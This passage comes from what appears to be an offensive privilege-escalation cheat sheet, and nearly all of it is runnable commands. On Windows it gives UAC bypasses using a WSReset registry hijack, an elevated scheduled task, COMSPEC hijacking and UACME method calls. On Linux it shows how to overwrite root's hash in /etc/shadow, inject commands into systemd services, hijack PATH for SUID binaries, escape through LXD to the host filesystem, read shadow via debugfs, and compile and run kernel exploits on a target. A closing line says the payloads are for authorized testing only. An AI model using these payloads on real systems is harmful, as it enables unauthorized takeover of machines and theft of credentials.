reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
wsreset.exe

# UAC bypass via SecurityCenterPSHModule
# Uses the Security Center COM object to execute elevated PowerShell
# Bypasses default UAC without registry modification
```

### 19.2 UAC Bypass via DLL Side-Loading

```powershell
# UAC bypass via consent.exe DLL hijacking
# Requires placing a malicious version.dll in System32 directory
# Works when UAC is configured to "Always Notify" (highest setting)

# UAC bypass via Task Scheduler (auto-elevated COM object)
# Create a scheduled task that runs as highest available privilege
schtasks /create /tn "UACBypass" /tr "C:\Temp\malicious.exe" /sc once /st 00:00 /rl HIGHEST
schtasks /run /tn "UACBypass"
schtasks /delete /tn "UACBypass" /f

# UAC bypass via env variable expansion (Token Broker)
# Exploit DLL search order in token broker runtime
set COMSPEC=C:\Temp\malicious.exe
# Then trigger any auto-elevated COM object
```

### 19.3 Automated UAC Bypass Toolkit

```powershell
# UACME (https://github.com/hfiref0x/UACME) -- 60+ bypass methods
# Method 23: fodhelper.exe bypass (reliable on Win10/11)
Akagi64.exe 23 C:\Temp\malicious.exe

# Method 33: CMSTP bypass (works on all Windows versions)
Akagi64.exe 33 C:\Temp\malicious.exe

# Method 34: Slui.exe bypass
Akagi64.exe 34 C:\Temp\malicious.exe

# Method 41: Token Broker bypass (Win10 1709+)
Akagi64.exe 41 C:\Temp\malicious.exe

# Method 61: WSReset.exe bypass (Windows Store)
Akagi64.exe 61 C:\Temp\malicious.exe

# Method 72: COM handlers bypass (Win10 21H2+)
Akagi64.exe 72 C:\Temp\malicious.exe
```

---

---

## 20. Miscellaneous Escalation Vectors

### 20.1 Writable /etc/shadow

```bash
# Check if /etc/shadow is writable
ls -la /etc/shadow

# Generate password hash for new password
openssl passwd -6 -salt hacker password123

# Replace root password hash in /etc/shadow
sed -i 's|^root:[^:]*:|root:$6$hacker$HASH_HERE:|' /etc/shadow

# Or append a known hash for root
echo 'root:$6$hacker$HASH_HERE:19000:0:99999:7:::' > /tmp/root_entry
cat /tmp/root_entry /etc/shadow > /tmp/new_shadow
mv /tmp/new_shadow /etc/shadow
```

### 20.2 Capstone Linux Privilege Escalation Checklist

```bash
# Quick privilege escalation enumeration script
echo "[*] Kernel and OS:" && uname -a && cat /etc/os-release
echo "[*] Current user:" && id && whoami
echo "[*] SUID binaries:" && find / -perm -4000 -type f 2>/dev/null
echo "[*] Capabilities:" && getcap -r / 2>/dev/null
echo "[*] sudo rules:" && sudo -l 2>/dev/null
echo "[*] Cron jobs:" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron.*
echo "[*] Writable /etc/passwd:" && ls -la /etc/passwd
echo "[*] Writable /etc/shadow:" && ls -la /etc/shadow
echo "[*] Docker socket:" && ls -la /var/run/docker.sock 2>/dev/null
echo "[*] NFS exports:" && cat /etc/exports 2>/dev/null
echo "[*] Container check:" && cat /proc/1/cgroup 2>/dev/null | head -3
```

### 20.3 Systemd Timer Abuse

```bash
# Find writable systemd timers
find /etc/systemd -name "*.timer" -writable 2>/dev/null
find /etc/systemd -name "*.service" -writable 2>/dev/null

# If a service run by root is writable, inject a command
echo "ExecStartPre=/bin/bash -c 'chmod u+s /bin/bash'" >> /etc/systemd/system/vulnerable.service
systemctl daemon-reload

# Check active timers
systemctl list-timers --all
```

### 20.4 Path Variable Hijacking (Non-Cron)

```bash
# Check PATH for writable directories
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done

# If a SUID binary calls another command without full path, hijack it
# Example: SUID binary calls 'system("ps")' instead of 'system("/usr/bin/ps")'
echo '/bin/bash -p' > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
./suid_binary  # Will execute /tmp/ps instead of /usr/bin/ps
```

### 20.5 Linux Group-Based Escalation

```bash
# Check current user groups for escalation vectors
id
groups

# disk group -- can read block devices directly
debugfs /dev/sda1
# Inside debugfs: cat /etc/shadow

# lxd/lxc group -- container escape via LXD
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc /bin/sh
# Access host filesystem at /mnt/root

# video group -- can read framebuffer
cat /dev/fb0 > /tmp/screen.raw
# Convert raw framebuffer to viewable image

# adm group -- can read system logs
cat /var/log/auth.log | grep -i "sudo\|su\|password"
zcat /var/log/auth.log.*.gz | grep -i "password" | grep -v "COMMAND"
```

### 20.6 Kernel Module and Exploit Compilation

```bash
# Compile and run kernel exploit from source on target
# Often needed when pre-compiled binaries are not available

# Check for compiler availability
which gcc cc make

# If no compiler, check for alternatives
which python python3 perl ruby php
# Python can compile C code via subprocess
python3 -c "import subprocess; subprocess.run(['gcc', '-o', 'exploit', 'exploit.c'])"

# Transfer exploit source via base64 encoding (when binary transfer fails)
# On attacker:
base64 -w0 exploit.c | tr -d '\n' > exploit.b64
# On target:
echo "BASE64_CONTENT" | base64 -d > exploit.c && gcc -o exploit exploit.c && ./exploit
```

---

_All payloads are for authorized penetration testing scenarios only. Unauthorized use is illegal._

_Last updated: 2026-06-10_
